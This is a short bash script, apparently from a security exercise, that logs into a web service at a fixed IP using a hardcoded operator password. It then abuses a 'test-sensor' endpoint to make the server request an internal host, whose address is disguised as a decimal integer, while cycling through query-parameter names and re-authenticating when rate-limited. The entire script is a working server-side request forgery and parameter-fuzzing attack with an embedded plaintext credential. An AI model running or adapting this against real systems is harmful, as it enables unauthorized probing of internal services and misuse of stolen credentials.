#!/bin/bash
BASE="http://169.58.126.107:6002"
dec=2887319554
jar=$(mktemp)
/usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
for p in "$@"; do
  res=$(/usr/bin/curl -s -m 5 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:4000/status?$p=1")
  if [[ "$res" == *"Redirecting"* ]] || [[ "$res" == *"rate limited"* ]]; then
    /usr/bin/curl -s -c "$jar" -X POST "$BASE/login" -d "username=operator&password=St33lW0rks!2024" -o /dev/null
    res=$(/usr/bin/curl -s -m 5 -b "$jar" -X POST "$BASE/ops/test-sensor" --data-urlencode "url=http://$dec:4000/status?$p=1")
  fi
  echo "$p: $res"
  sleep 3
done
rm -f "$jar"
